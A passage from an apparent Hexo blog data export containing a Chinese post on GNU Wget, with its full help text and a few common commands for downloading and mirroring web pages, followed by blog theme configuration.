HTTP keep-alive (persistent connections).\n       --no-cookies            don't use cookies.\n       --load-cookies=FILE     load cookies from FILE before session.\n       --save-cookies=FILE     save cookies to FILE after session.\n       --keep-session-cookies  load and save session (non-permanent) cookies.\n       --post-data=STRING      use the POST method; send STRING as the data.\n       --post-file=FILE        use the POST method; send contents of FILE.\n       --content-disposition   honor the Content-Disposition header when\n                               choosing local file names (EXPERIMENTAL).\n       --auth-no-challenge     Send Basic HTTP authentication information\n                               without first waiting for the server's\n                               challenge.\n\nHTTPS (SSL/TLS) options:\n       --secure-protocol=PR     choose secure protocol, one of auto, SSLv2,\n                                SSLv3, and TLSv1.\n       --no-check-certificate   don't validate the server's certificate.\n       --certificate=FILE       client certificate file.\n       --certificate-type=TYPE  client certificate type, PEM or DER.\n       --private-key=FILE       private key file.\n       --private-key-type=TYPE  private key type, PEM or DER.\n       --ca-certificate=FILE    file with the bundle of CA's.\n       --ca-directory=DIR       directory where hash list of CA's is stored.\n       --random-file=FILE       file with random data for seeding the SSL PRNG.\n       --egd-file=FILE          file naming the EGD socket with random data.\n\nFTP options:\n       --ftp-user=USER         set ftp user to USER.\n       --ftp-password=PASS     set ftp password to PASS.\n       --no-remove-listing     don't remove `.listing' files.\n       --no-glob               turn off FTP file name globbing.\n       --no-passive-ftp        disable the \"passive\" transfer mode.\n       --retr-symlinks         when recursing, get linked-to files (not dir).\n       --preserve-permissions  preserve remote file permissions.\n\nRecursive download:\n  -r,  --recursive          specify recursive download.\n  -l,  --level=NUMBER       maximum recursion depth (inf or 0 for infinite).\n       --delete-after       delete files locally after downloading them.\n  -k,  --convert-links      make links in downloaded HTML point to local files.\n  -K,  --backup-converted   before converting file X, back up as X.orig.\n  -m,  --mirror             shortcut for -N -r -l inf --no-remove-listing.\n  -p,  --page-requisites    get all images, etc. needed to display HTML page.\n       --strict-comments    turn on strict (SGML) handling of HTML comments.\n\nRecursive accept/reject:\n  -A,  --accept=LIST               comma-separated list of accepted extensions.\n  -R,  --reject=LIST               comma-separated list of rejected extensions.\n  -D,  --domains=LIST              comma-separated list of accepted domains.\n       --exclude-domains=LIST      comma-separated list of rejected domains.\n       --follow-ftp                follow FTP links from HTML documents.\n       --follow-tags=LIST          comma-separated list of followed HTML tags.\n       --ignore-tags=LIST          comma-separated list of ignored HTML tags.\n  -H,  --span-hosts                go to foreign hosts when recursive.\n  -L,  --relative                  follow relative links only.\n  -I,  --include-directories=LIST  list of allowed directories.\n  -X,  --exclude-directories=LIST  list of excluded directories.\n  -np, --no-parent                 don't ascend to the parent directory.\n```\n## 常用Wget指令\n```cmd\nwget http://xxx.cn\t\t\t\t\t//下载网页源代码\nwget -r http://xxx.cn\t\t\t\t\t//递归下载网站源代码\nwget -r --no-cookie --no-check-certificate\t\t//忽略SSL证书验证\nwget -c -r -p -k http://xxx.cn\t\t\t\t//断点续传，整站下载\n```","source":"_posts/Wget.md","raw":"---\ntitle: Wget命令解释\ndate: 2019-03-29 17:11:09\ncategories:\n  - 操作系统\n  - Shell\ntags:\n  - Wget\nabbrlink: 2640927a\nupdated:\n---\n# 使用帮助\n\nGNU Wget 1.11.4，非交互式的网络文件下载工具。\n用法： wget [选项]... [URL]...\nMandatory arguments to long options are mandatory for short options too.\n\n## Wget for Windows\n官网：http://gnuwin32.sourceforge.net/packages/wget.htm\n下载地址：http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe\n<!--more-->\n## Wget -- --help\n```cmake\nStartup:\n  -V,  --version           display the version of Wget and exit.\n  -h,  --help              print this help.\n  -b,  --background        go to background after startup.\n  -e,  --execute=COMMAND   execute a `.wgetrc'-style command.\n\nLogging and input file:\n  -o,  --output-file=FILE    log messages to FILE.\n  -a,  --append-output=FILE  append messages to FILE.\n  -d,  --debug               print lots of debugging information.\n  -q,  --quiet               quiet (no output).\n  -v,  --verbose             be verbose (this is the default).\n  -nv, --no-verbose          turn off verboseness, without being quiet.\n  -i,  --input-file=FILE     download URLs found in FILE.\n  -F,  --force-html          treat input file as HTML.\n  -B,  --base=URL            prepends URL to relative links in -F -i file.\n\nDownload:\n  -t,  --tries=NUMBER            set number of retries to NUMBER (0 unlimits).\n       --retry-connrefused       retry even if connection is refused.\n  -O,  --output-document=FILE    write documents to FILE.\n  -nc, --no-clobber              skip downloads that would download to\n                                 existing files.\n  -c,  --continue                resume getting a partially-downloaded file.\n       --progress=TYPE           select progress gauge type.\n  -N,  --timestamping            don't re-retrieve files unless newer than\n                                 local.\n  -S,  --server-response         print server response.\n       --spider                  don't download anything.\n  -T,  --timeout=SECONDS         set all timeout values to SECONDS.\n       --dns-timeout=SECS        set the DNS lookup timeout to SECS.\n       --connect-timeout=SECS    set the connect timeout to SECS.\n       --read-timeout=SECS       set the read timeout to SECS.\n  -w,  --wait=SECONDS            wait SECONDS between retrievals.\n       --waitretry=SECONDS       wait 1..SECONDS between retries of a retrieval.\n       --random-wait             wait from 0...2*WAIT secs between retrievals.\n       --no-proxy                explicitly turn off proxy.\n  -Q,  --quota=NUMBER            set retrieval quota to NUMBER.\n       --bind-address=ADDRESS    bind to ADDRESS (hostname or IP) on local host.\n       --limit-rate=RATE         limit download rate to RATE.\n       --no-dns-cache            disable caching DNS lookups.\n       --restrict-file-names=OS  restrict chars in file names to ones OS allows.\n       --ignore-case             ignore case when matching files/directories.\n  -4,  --inet4-only              connect only to IPv4 addresses.\n  -6,  --inet6-only              connect only to IPv6 addresses.\n       --prefer-family=FAMILY    connect first to addresses of specified family,\n                                 one of IPv6, IPv4, or none.\n       --user=USER               set both ftp and http user to USER.\n       --password=PASS           set both ftp and http password to PASS.\n\nDirectories:\n  -nd, --no-directories           don't create directories.\n  -x,  --force-directories        force creation of directories.\n  -nH, --no-host-directories      don't create host directories.\n       --protocol-directories     use protocol name in directories.\n  -P,  --directory-prefix=PREFIX  save files to PREFIX/...\n       --cut-dirs=NUMBER          ignore NUMBER remote directory components.\n\nHTTP options:\n       --http-user=USER        set http user to USER.\n       --http-password=PASS    set http password to PASS.\n       --no-cache              disallow server-cached data.\n  -E,  --html-extension        save HTML documents with `.html' extension.\n       --ignore-length         ignore `Content-Length' header field.\n       --header=STRING         insert STRING among the headers.\n       --max-redirect          maximum redirections allowed per page.\n       --proxy-user=USER       set USER as proxy username.\n       --proxy-password=PASS   set PASS as proxy password.\n       --referer=URL           include `Referer: URL' header in HTTP request.\n       --save-headers          save the HTTP headers to file.\n  -U,  --user-agent=AGENT      identify as AGENT instead of Wget/VERSION.\n       --no-http-keep-alive    disable HTTP keep-alive (persistent connections).\n       --no-cookies            don't use cookies.\n       --load-cookies=FILE     load cookies from FILE before session.\n       --save-cookies=FILE     save cookies to FILE after session.\n       --keep-session-cookies  load and save session (non-permanent) cookies.\n       --post-data=STRING      use the POST method; send STRING as the data.\n       --post-file=FILE        use the POST method; send contents of FILE.\n       --content-disposition   honor the Content-Disposition header when\n                               choosing local file names (EXPERIMENTAL).\n       --auth-no-challenge     Send Basic HTTP authentication information\n                               without first waiting for the server's\n                               challenge.\n\nHTTPS (SSL/TLS) options:\n       --secure-protocol=PR     choose secure protocol, one of auto, SSLv2,\n                                SSLv3, and TLSv1.\n       --no-check-certificate   don't validate the server's certificate.\n       --certificate=FILE       client certificate file.\n       --certificate-type=TYPE  client certificate type, PEM or DER.\n       --private-key=FILE       private key file.\n       --private-key-type=TYPE  private key type, PEM or DER.\n       --ca-certificate=FILE    file with the bundle of CA's.\n       --ca-directory=DIR       directory where hash list of CA's is stored.\n       --random-file=FILE       file with random data for seeding the SSL PRNG.\n       --egd-file=FILE          file naming the EGD socket with random data.\n\nFTP options:\n       --ftp-user=USER         set ftp user to USER.\n       --ftp-password=PASS     set ftp password to PASS.\n       --no-remove-listing     don't remove `.listing' files.\n       --no-glob               turn off FTP file name globbing.\n       --no-passive-ftp        disable the \"passive\" transfer mode.\n       --retr-symlinks         when recursing, get linked-to files (not dir).\n       --preserve-permissions  preserve remote file permissions.\n\nRecursive download:\n  -r,  --recursive          specify recursive download.\n  -l,  --level=NUMBER       maximum recursion depth (inf or 0 for infinite).\n       --delete-after       delete files locally after downloading them.\n  -k,  --convert-links      make links in downloaded HTML point to local files.\n  -K,  --backup-converted   before converting file X, back up as X.orig.\n  -m,  --mirror             shortcut for -N -r -l inf --no-remove-listing.\n  -p,  --page-requisites    get all images, etc. needed to display HTML page.\n       --strict-comments    turn on strict (SGML) handling of HTML comments.\n\nRecursive accept/reject:\n  -A,  --accept=LIST               comma-separated list of accepted extensions.\n  -R,  --reject=LIST               comma-separated list of rejected extensions.\n  -D,  --domains=LIST              comma-separated list of accepted domains.\n       --exclude-domains=LIST      comma-separated list of rejected domains.\n       --follow-ftp                follow FTP links from HTML documents.\n       --follow-tags=LIST          comma-separated list of followed HTML tags.\n       --ignore-tags=LIST          comma-separated list of ignored HTML tags.\n  -H,  --span-hosts                go to foreign hosts when recursive.\n  -L,  --relative                  follow relative links only.\n  -I,  --include-directories=LIST  list of allowed directories.\n  -X,  --exclude-directories=LIST  list of excluded directories.\n  -np, --no-parent                 don't ascend to the parent directory.\n```\n## 常用Wget指令\n```cmd\nwget http://xxx.cn\t\t\t\t\t//下载网页源代码\nwget -r http://xxx.cn\t\t\t\t\t//递归下载网站源代码\nwget -r --no-cookie --no-check-certificate\t\t//忽略SSL证书验证\nwget -c -r -p -k http://xxx.cn\t\t\t\t//断点续传，整站下载\n```","slug":"Wget","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkby002nqse51yfhbhxn","content":"<h1 id=\"使用帮助\"><a href=\"#使用帮助\" class=\"headerlink\" title=\"使用帮助\"></a>使用帮助</h1><p>GNU Wget 1.11.4，非交互式的网络文件下载工具。<br>用法： wget [选项]… [URL]…<br>Mandatory arguments to long options are mandatory for short options too.</p>\n<h2 id=\"Wget-for-Windows\"><a href=\"#Wget-for-Windows\" class=\"headerlink\" title=\"Wget for Windows\"></a>Wget for Windows</h2><p>官网：<a href=\"http://gnuwin32.sourceforge.net/packages/wget.htm\">http://gnuwin32.sourceforge.net/packages/wget.htm</a><br>下载地址：<a href=\"http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe\">http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe</a><br><a id=\"more\"></a></p>\n<h2 id=\"Wget-—-—help\"><a href=\"#Wget-—-—help\" class=\"headerlink\" title=\"Wget — —help\"></a>Wget — —help</h2><figure class=\"highlight cmake\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Startup:</span><br><span class=\"line\">  -V,  --version           display the version of Wget <span class=\"keyword\">and</span> exit.</span><br><span class=\"line\">  -h,  --help              print this help.</span><br><span class=\"line\">  -b,  --background        go to background after startup.</span><br><span class=\"line\">  -e,  --execute=<span class=\"keyword\">COMMAND</span>   execute a `.wgetrc&#x27;-style <span class=\"keyword\">command</span>.</span><br><span class=\"line\"></span><br><span class=\"line\">Logging <span class=\"keyword\">and</span> input <span class=\"keyword\">file</span>:</span><br><span class=\"line\">  -o,  --output-<span class=\"keyword\">file</span>=<span class=\"keyword\">FILE</span>    log messages to <span class=\"keyword\">FILE</span>.</span><br><span class=\"line\">  -a,  --append-output=<span class=\"keyword\">FILE</span>  append messages to <span class=\"keyword\">FILE</span>.</span><br><span class=\"line\">  -d,  --debug               print lots of debugging information.</span><br><span class=\"line\">  -q,  --quiet               quiet (no output).</span><br><span class=\"line\">  -v,  --verbose             be verbose (this is the default).</span><br><span class=\"line\">  -nv, --no-verbose          turn <span class=\"keyword\">off</span> verboseness, without being quiet.</span><br><span class=\"line\">  -i,  --input-<span class=\"keyword\">file</span>=<span class=\"keyword\">FILE</span>     download URLs found in <span class=\"keyword\">FILE</span>.</span><br><span class=\"line\">  -F,  --force-html          treat input <span class=\"keyword\">file</span> as HTML.</span><br><span class=\"line\">  -B,  --base=URL            prepends URL to relative links in -F -i <span class=\"keyword\">file</span>.</span><br><span class=\"line\"></span><br><span class=\"line\">Download:</span><br><span class=\"line\">  -t,  --tries=NUMBER            <span class=\"keyword\">set</span> number of retries to NUMBER (<span class=\"number\">0</span> unlimits).</span><br><span class=\"line\">       --retry-connrefused       retry even <span class=\"keyword\">if</span> connection is refused.</span><br><span class=\"line\">  -O,  --output-document=<span class=\"keyword\">FILE</span>    write documents to <span class=\"keyword\">FILE</span>.</span><br><span class=\"line\">  -nc, --no-clobber              skip downloads that would download to</span><br><span class=\"line\">                                 existing files.</span><br><span class=\"line\">  -c,  --<span class=\"keyword\">continue</span>                resume getting a partially-downloaded <span class=\"keyword\">file</span>.</span><br><span class=\"line\">       --progress=TYPE           select progress gauge type.</span><br><span class=\"line\">  -N,  --timestamping            don&#x27;t re-retrieve files unless newer than</span><br><span class=\"line\">                                 local.</span><br><span class=\"line\">  -S,  --server-response         print server response.</span><br><span class=\"line\">       --spider                  don&#x27;t download anything.</span><br><span class=\"line\">  -T,  --timeout=SECONDS         <span class=\"keyword\">set</span> all timeout values to SECONDS.</span><br><span class=\"line\">       --dns-timeout=SECS        <span class=\"keyword\">set</span> the DNS lookup timeout to SECS.</span><br><span class=\"line\">       --connect-timeout=SECS    <span class=\"keyword\">set</span> the connect timeout to SECS.</span><br><span class=\"line\">       --read-timeout=SECS       <span class=\"keyword\">set</span> the read timeout to SECS.</span><br><span class=\"line\">  -w,  --wait=SECONDS            wait SECONDS between retrievals.</span><br><span class=\"line\">       --waitretry=SECONDS       wait <span class=\"number\">1</span>..SECONDS between retries of a retrieval.</span><br><span class=\"line\">       --random-wait             wait from <span class=\"number\">0</span>...<span class=\"number\">2</span>*WAIT secs between retrievals.</span><br><span class=\"line\">       --no-proxy                explicitly turn <span class=\"keyword\">off</span> proxy.</span><br><span class=\"line\">  -Q,  --quota=NUMBER            <span class=\"keyword\">set</span> retrieval quota to NUMBER.</span><br><span class=\"line\">       --bind-address=ADDRESS    bind to ADDRESS (hostname <span class=\"keyword\">or</span> IP) <span class=\"keyword\">on</span> local host.</span><br><span class=\"line\">       --limit-rate=RATE         limit download rate to RATE.</span><br><span class=\"line\">       --no-dns-cache            disable caching DNS lookups.</span><br><span class=\"line\">       --restrict-<span class=\"keyword\">file</span>-names=OS  restrict chars in <span class=\"keyword\">file</span> names to ones OS allows.</span><br><span class=\"line\">       --ignore-case             ignore case when matching files/directories.</span><br><span class=\"line\">  -<span class=\"number\">4</span>,  --inet4-only              connect only to IPv4 addresses.</span><br><span class=\"line\">  -<span class=\"number\">6</span>,  --inet6-only              connect only to IPv6 addresses.</span><br><span class=\"line\">       --prefer-family=FAMILY    connect first to addresses of specified family,</span><br><span class=\"line\">                                 one of IPv6, IPv4, <span class=\"keyword\">or</span> none.</span><br><span class=\"line\">       --user=USER               <span class=\"keyword\">set</span> both ftp <span class=\"keyword\">and</span> http user to USER.</span><br><span class=\"line\">       --password=PASS           <span class=\"keyword\">set</span> both ftp <span class=\"keyword\">and</span> http password to PASS.</span><br><span class=\"line\"></span><br><span class=\"line\">Directories:</span><br><span class=\"line\">  -nd, --no-directories           don&#x27;t create directories.</span><br><span class=\"line\">  -x,  --force-directories        force creation of directories.</span><br><span class=\"line\">  -nH, --no-host-directories      don&#x27;t create host directories.</span><br><span class=\"line\">       --protocol-directories     use protocol name in directories.</span><br><span class=\"line\">  -P,  --directory-prefix=PREFIX  save files to PREFIX/...</span><br><span class=\"line\">       --cut-dirs=NUMBER          ignore NUMBER remote directory components.</span><br><span class=\"line\"></span><br><span class=\"line\">HTTP options:</span><br><span class=\"line\">       --http-user=USER        <span class=\"keyword\">set</span> http user to USER.</span><br><span class=\"line\">       --http-password=PASS    <span class=\"keyword\">set</span> http password to PASS.</span><br><span class=\"line\">       --no-cache              disallow server-cached data.</span><br><span class=\"line\">  -E,  --html-extension        save HTML documents with `.html&#x27; extension.</span><br><span class=\"line\">       --ignore-length         ignore `Content-Length&#x27; header field.</span><br><span class=\"line\">       --header=<span class=\"keyword\">STRING</span>         insert <span class=\"keyword\">STRING</span> among the headers.</span><br><span class=\"line\">       --max-redirect          maximum redirections allowed per page.</span><br><span class=\"line\">       --proxy-user=USER       <span class=\"keyword\">set</span> USER as proxy username.</span><br><span class=\"line\">       --proxy-password=PASS   <span class=\"keyword\">set</span> PASS as proxy password.</span><br><span class=\"line\">       --referer=URL           <span class=\"keyword\">include</span> `Referer: URL&#x27; header in HTTP request.</span><br><span class=\"line\">       --save-headers          save the HTTP headers to <span class=\"keyword\">file</span>.</span><br><span class=\"line\">  -U,  --user-agent=AGENT      identify as AGENT instead of Wget/VERSION.</span><br><span class=\"line\">       --no-http-keep-alive    disable HTTP keep-alive (persistent connections).</span><br><span class=\"line\">       --no-cookies            don&#x27;t use cookies.</span><br><span class=\"line\">       --load-cookies=<span class=\"keyword\">FILE</span>     load cookies from <span class=\"keyword\">FILE</span> before session.</span><br><span class=\"line\">       --save-cookies=<span class=\"keyword\">FILE</span>     save cookies to <span class=\"keyword\">FILE</span> after session.</span><br><span class=\"line\">       --keep-session-cookies  load <span class=\"keyword\">and</span> save session (non-permanent) cookies.</span><br><span class=\"line\">       --post-data=<span class=\"keyword\">STRING</span>      use the POST method; send <span class=\"keyword\">STRING</span> as the data.</span><br><span class=\"line\">       --post-<span class=\"keyword\">file</span>=<span class=\"keyword\">FILE</span>        use the POST method; send contents of <span class=\"keyword\">FILE</span>.</span><br><span class=\"line\">       --content-disposition   honor the Content-Disposition header when</span><br><span class=\"line\">                               choosing local <span class=\"keyword\">file</span> names (EXPERIMENTAL).</span><br><span class=\"line\">       --auth-no-challenge     Send Basic HTTP authentication information</span><br><span class=\"line\">                               without first waiting for the server&#x27;s</span><br><span class=\"line\">                               challenge.</span><br><span class=\"line\"></span><br><span class=\"line\">HTTPS (SSL/TLS) options:</span><br><span class=\"line\">       --secure-protocol=PR     choose secure protocol, one of auto, SSLv2,</span><br><span class=\"line\">                                SSLv3, <span class=\"keyword\">and</span> TLSv1.</span><br><span class=\"line\">       --no-check-certificate   don&#x27;t validate the server&#x27;s certificate.</span><br><span class=\"line\">       --certificate=<span class=\"keyword\">FILE</span>       client certificate <span class=\"keyword\">file</span>.</span><br><span class=\"line\">       --certificate-type=TYPE  client certificate type, PEM <span class=\"keyword\">or</span> DER.</span><br><span class=\"line\">       --private-key=<span class=\"keyword\">FILE</span>       private key <span class=\"keyword\">file</span>.</span><br><span class=\"line\">       --private-key-type=TYPE  private key type, PEM <span class=\"keyword\">or</span> DER.</span><br><span class=\"line\">       --ca-certificate=<span class=\"keyword\">FILE</span>    <span class=\"keyword\">file</span> with the bundle of CA&#x27;s.</span><br><span class=\"line\">       --ca-directory=DIR       directory where hash <span class=\"keyword\">list</span> of CA&#x27;s is stored.</span><br><span class=\"line\">       --random-<span class=\"keyword\">file</span>=<span class=\"keyword\">FILE</span>       <span class=\"keyword\">file</span> with random data for seeding the SSL PRNG.</span><br><span class=\"line\">       --egd-<span class=\"keyword\">file</span>=<span class=\"keyword\">FILE</span>          <span class=\"keyword\">file</span> naming the EGD socket with random data.</span><br><span class=\"line\"></span><br><span class=\"line\">FTP options:</span><br><span class=\"line\">       --ftp-user=USER         <span class=\"keyword\">set</span> ftp user to USER.</span><br><span class=\"line\">       --ftp-password=PASS     <span class=\"keyword\">set</span> ftp password to PASS.</span><br><span class=\"line\">       --no-<span class=\"keyword\">remove</span>-listing     don&#x27;t <span class=\"keyword\">remove</span> `.listing&#x27; files.</span><br><span class=\"line\">       --no-glob               turn <span class=\"keyword\">off</span> FTP <span class=\"keyword\">file</span> name globbing.</span><br><span class=\"line\">       --no-passive-ftp        disable the <span class=\"string\">&quot;passive&quot;</span> transfer mode.</span><br><span class=\"line\">       --retr-symlinks         when recursing, get linked-to files (<span class=\"keyword\">not</span> dir).</span><br><span class=\"line\">       --preserve-permissions  preserve remote <span class=\"keyword\">file</span> permissions.</span><br><span class=\"line\"></span><br><span class=\"line\">Recursive download:</span><br><span class=\"line\">  -r,  --recursive          specify recursive download.</span><br><span class=\"line\">  -l,  --level=NUMBER       maximum recursion depth (inf <span class=\"keyword\">or</span> <span class=\"number\">0</span> for infinite).</span><br><span class=\"line\">       --delete-after       delete files locally after downloading them.</span><br><span class=\"line\">  -k,  --convert-links      make links in downloaded HTML point to local files.</span><br><span class=\"line\">  -K,  --backup-converted   before converting <span class=\"keyword\">file</span> X, back up as X.orig.</span><br><span class=\"line\">  -m,  --mirror             shortcut for -N -r -l inf --no-<span class=\"keyword\">remove</span>-listing.</span><br><span class=\"line\">  -p,  --page-requisites    get all images, etc. needed to display HTML page.</span><br><span class=\"line\">       --strict-comments    turn <span class=\"keyword\">on</span> strict (SGML) handling of HTML comments.</span><br><span class=\"line\"></span><br><span class=\"line\">Recursive accept/reject:</span><br><span class=\"line\">  -A,  --accept=<span class=\"keyword\">LIST</span>               comma-separated <span class=\"keyword\">list</span> of accepted extensions.</span><br><span class=\"line\">  -R,  --reject=<span class=\"keyword\">LIST</span>               comma-separated <span class=\"keyword\">list</span> of rejected extensions.</span><br><span class=\"line\">  -D,  --domains=<span class=\"keyword\">LIST</span>              comma-separated <span class=\"keyword\">list</span> of accepted domains.</span><br><span class=\"line\">       --exclude-domains=<span class=\"keyword\">LIST</span>      comma-separated <span class=\"keyword\">list</span> of rejected domains.</span><br><span class=\"line\">       --follow-ftp                follow FTP links from HTML documents.</span><br><span class=\"line\">       --follow-tags=<span class=\"keyword\">LIST</span>          comma-separated <span class=\"keyword\">list</span> of followed HTML tags.</span><br><span class=\"line\">       --ignore-tags=<span class=\"keyword\">LIST</span>          comma-separated <span class=\"keyword\">list</span> of ignored HTML tags.</span><br><span class=\"line\">  -H,  --span-hosts                go to foreign hosts when recursive.</span><br><span class=\"line\">  -L,  --relative                  follow relative links only.</span><br><span class=\"line\">  -I,  --<span class=\"keyword\">include</span>-directories=<span class=\"keyword\">LIST</span>  <span class=\"keyword\">list</span> of allowed directories.</span><br><span class=\"line\">  -X,  --exclude-directories=<span class=\"keyword\">LIST</span>  <span class=\"keyword\">list</span> of excluded directories.</span><br><span class=\"line\">  -np, --no-parent                 don&#x27;t ascend to the parent directory.</span><br></pre></td></tr></table></figure>\n<h2 id=\"常用Wget指令\"><a href=\"#常用Wget指令\" class=\"headerlink\" title=\"常用Wget指令\"></a>常用Wget指令</h2><figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://xxx.cn\t\t\t\t\t//下载网页源代码</span><br><span class=\"line\">wget -r http://xxx.cn\t\t\t\t\t//递归下载网站源代码</span><br><span class=\"line\">wget -r --no-cookie --no-check-certificate\t\t//忽略SSL证书验证</span><br><span class=\"line\">wget -c -r -p -k http://xxx.cn\t\t\t\t//断点续传，整站下载</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":